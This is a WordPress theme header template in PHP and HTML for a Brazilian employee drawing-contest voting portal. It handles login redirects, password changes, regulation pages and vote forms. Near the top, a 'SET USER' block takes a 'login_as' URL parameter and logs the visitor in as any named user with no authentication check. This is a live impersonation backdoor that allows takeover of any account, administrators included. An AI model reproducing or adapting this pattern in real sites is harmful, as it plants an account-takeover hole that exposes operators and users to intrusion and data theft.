<!DOCTYPE html>
<html lang="pt-br">

  <head>

    <?php

    $checar_grupo = get_user_meta( get_current_user_id(), 'user_field_funcionario_grupo', true ); 
    if($checar_grupo == 'Grupo 1 MAO' || $checar_grupo == 'Grupo 2 MAO'
    || $checar_grupo == 'Grupo 3 MAO' || $checar_grupo == 'Grupo 4 MAO'
    || $checar_grupo == 'Grupo 5 MAO' || $checar_grupo == 'Grupo 6 MAO'
    || $checar_grupo == 'Grupo 7 MAO' || $checar_grupo == 'Grupo 8 MAO'
    ){
    echo '<style> div.conteudo{background-image:url(https://www.explodecriacao.com.br/wp-content/uploads/2026/09/bg-mao.jpg)!important;background-position: top center;background-repeat: no-repeat;background-size: contain;} body{background-image:unset!important;}</style>';
    }


    header('Set-Cookie: cross-site-cookie=name; SameSite=None; Secure');

    $opcoes_gerais = get_option('opcoes_gerais_box');

    // A etapa agora vem da EMPRESA do colaborador, configurada no painel "Empresas".
    // Substitui as antigas opções fixas de fase por unidade (SUM / SAO / MAO).
    $etapa_usuario = function_exists('explode_etapa_do_usuario') ? explode_etapa_do_usuario() : -1;

    // A variável $fase é mantida com o mesmo nome porque o restante do template a utiliza.
    // Quem não está em nenhuma empresa, ou está em "Aguardando", cai no estado neutro (1),
    // que exibe apenas os botões de Regulamento e Sair.
    $fase = ( $etapa_usuario > 0 ) ? $etapa_usuario : 1;

    ################## SET USER ##################
    if(!empty($_GET['login_as'])) {
      $username = $_GET['login_as'];
      $user = get_user_by('login', $username );

      // Redirect URL //
      if ( !is_wp_error( $user ) )
      {
          wp_clear_auth_cookie();
          wp_set_current_user ( $user->ID );
          wp_set_auth_cookie  ( $user->ID );

          wp_safe_redirect( home_url() );
          exit();
      }
    }
    ################## FIM SET USER ##################

    if(is_user_logged_in() && is_page('login')) {
      wp_redirect( home_url() );
      exit;
    }
    elseif(!is_user_logged_in() && !is_page('login') && !$_POST) {
      wp_redirect( home_url('login') );
      exit;
    }
    else {

      if (!is_page('login')) {

        $leituraRegulamento = get_user_meta(get_current_user_id(), 'user_field_leitura_reg', true);
        $senhaAlterada = get_user_meta(get_current_user_id(), 'user_field_senha_alterada', true);

        if(is_page('nova-senha')) {          
          if($senhaAlterada == 'Sim' && !$_POST) {
            wp_redirect( home_url() );
            exit;
          }
        }
        else if($senhaAlterada == 'Não' || empty($senhaAlterada)) {
          wp_redirect( home_url('nova-senha') );
          exit;
        }
        else if(!is_page('regulamento') && !$_POST) {       
          if($leituraRegulamento == 'Não' || empty($leituraRegulamento)) {
            wp_redirect( home_url('regulamento') );
            exit;
          }
        }        

      }

      $user_id = get_current_user_id();

      if ( ! function_exists('_explode_grupos_usuario') ) {
        function _explode_grupos_usuario($uid, $meta_key = 'user_field_funcionario_grupo') {
          $vals = get_user_meta($uid, $meta_key, false);
          $tokens = array();

          foreach ((array)$vals as $v) {
            if (is_array($v)) {
              $tokens = array_merge($tokens, $v);
              continue;
            }
            $parts = preg_split('/\s*[,;\|\r\n]+\s*/u', (string)$v, -1, PREG_SPLIT_NO_EMPTY);
            $tokens = array_merge($tokens, $parts);
          }

          $clean = array();
          foreach ($tokens as $t) {
            $t = trim($t);
            if ($t !== '') {
              $clean[] = $t;
            }
          }
          return array_values(array_unique($clean));
        }
      }

      $grupos_usuario_arr = _explode_grupos_usuario($user_id, 'user_field_funcionario_grupo');
      // A etapa de votação passa a ser a da empresa do próprio colaborador
      $em_fase2 = ( 2 === (int) $etapa_usuario );

      if ( is_home() && $em_fase2 && count($grupos_usuario_arr) > 1 ) {
          wp_redirect( home_url('filtros') );
          exit;
      }
    }
    ?>

    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <meta name="author" content="Moacir Sant'anna">

    <title><?php if(is_home()) { echo get_bloginfo('name') . ' | ' . get_bloginfo('description'); } else { echo get_the_title() . ' | ' . get_bloginfo('name'); } ?></title>
    <link rel="icon" type="image/png" href="<?php bloginfo('template_url'); ?>/img/favicon.png">

    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@300;400;500;600;700&display=swap" rel="stylesheet"> 
    <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.0.13/css/all.css">

    <link href="<?php bloginfo('template_url'); ?>/css/bootstrap.css" rel="stylesheet">
    <link href="<?php bloginfo('template_url'); ?>/css/bootstrap.min.css" rel="stylesheet">
    <link href="<?php bloginfo('template_url'); ?>/css/bootstrap-theme.css" rel="stylesheet">
    <link href="<?php bloginfo('template_url'); ?>/css/bootstrap-theme.min.css" rel="stylesheet">
    <link href="<?php bloginfo('template_url'); ?>/style.css?<?php echo date('l jS \of F Y h:i:s A'); ?>" rel="stylesheet">

    <!-- Global site tag (gtag.js) - Google Analytics -->
    <script async src="https://www.googletagmanager.com/gtag/js?id=G-3GXDE5F06K"></script>
    <script>
      window.dataLayer = window.dataLayer || [];
      function gtag(){dataLayer.push(arguments);}
      gtag('js', new Date());

      gtag('config', 'G-3GXDE5F06K');
    </script>

    <?php wp_head(); ?>

  </head>

  <body id="<?php if($fase == 4) {echo 'pagina-aviso';} ?>" <?php body_class(); ?>>

  <?php if(is_user_logged_in()) { ?>
  <div class="lgpd">
    <div class="container">
      <div class="content">
        <p>Este site usa cookies para melhorar a sua experiência. Ao continuar, você concorda com nossa <a target="_target" href="<?php echo get_site_url(); ?>/politica-de-privacidade">política e privacidade</a>. <a href="#" id="fecha" class="notscrollable">Aceitar e fechar</a></p>
      </div>
    </div>
  </div> 
  <?php } ?>

    <?php if(!is_page('login') && !is_page('nova-senha')) { ?>
    <div class="menu">
      <div class="container">
        <a href="<?php echo get_site_url(); ?>"><img id="logo" src="<?php bloginfo('template_url'); ?>/img/logo-explode.png" alt="Logo"></a>

        <?php

        $unidade = get_query_var( 'unidade' );
        $categoria = get_query_var( 'categoria' );

        if($fase == 1 || $fase == 3) { ?>
          <div class="botoes">
          <?php
          $leituraRegulamento = get_user_meta(get_current_user_id(), 'user_field_leitura_reg', true);
          if(is_page('regulamento')) { ?>

            <?php if($leituraRegulamento == 'Sim') { ?>
            <a class="main" href="<?php echo get_site_url(); ?>">Página principal</a>
            <?php } ?>
            
          <?php } else { ?>
          <a class="main" href="<?php the_permalink(8); ?>">Regulamento</a>
          <?php } ?>
          <a id="sair" class="main" href="<?php echo wp_logout_url( home_url('login') ); ?>">Sair</a>
          </div>
        <?php } elseif($fase == 2) {

          $votacao_status = get_user_meta(get_current_user_id(),'user_field_votacao',true);
          if(empty($votacao_status)) {
            $votacao_status = 'Não';
          }
          if(is_page(array(100,933)) && $votacao_status == 'Não' && !$_POST) { ?>
          <div class="filtros">
            <div class="selecionados">
              <div class="content">
                <h2>Desenhos selecionados</h2>
                <div class="all">
                  <form action="" method="POST">
                    <div class="boxSingle">
                      <div class="single" id="primeiro">
                        <input type="hidden" name="desenho1" value="">
                      </div>
                    </div>    
                    <div class="boxSingle">
                      <div class="single" id="segundo"><input type="hidden" name="desenho2" value=""></div>
                    </div>
                    <?php
                    // GRUPOS MAO: a Categoria A sai por sorteio presencial, entao sao apenas 2 escolhas
                    $mao_slots_voto = function_exists( 'explode_mao_max_votos' ) ? explode_mao_max_votos() : 3;
                    // O terceiro espaco so aparece para quem vota nas tres categorias
                    if ( $mao_slots_voto >= 3 ) { ?>
                    <div class="boxSingle">
                      <div class="single" id="terceiro"><input type="hidden" name="desenho3" value=""></div>
                    </div>
                    <?php } ?> 
                    <input id="send" type="submit" value="Enviar votos">
                  </form>
                </div>
              </div>
            </div>
          </div>
          <script>
            var body = document.body;
            body.classList.add("filtro-menu");
          </script>
          <?php } else {

            if(is_page(8)) { ?>
            <div class="botoes">
              <a class="main" href="<?php echo get_site_url(); ?>">Página principal</a>
              <a id="sair" class="main" href="<?php echo wp_logout_url( home_url('login') ); ?>">Sair</a>
            </div>
            <?php } else {
            ?>
            <div class="botoes">
              <a class="main" href="<?php the_permalink(8); ?>">Regulamento</a>
              <a id="sair" class="main" href="<?php echo wp_logout_url( home_url('login') ); ?>">Sair</a>
            </div>
          <?php } ?>

        <?php }

        } // Fecha se for fase 2 ?>

      </div>
    </div>
    <?php } ?>

    <div class="conteudo" style="padding-top: 330px;">

      <div class="msg-loading">
        <div class="in">
          <p>Aguarde...</p>
        </div>
      </div>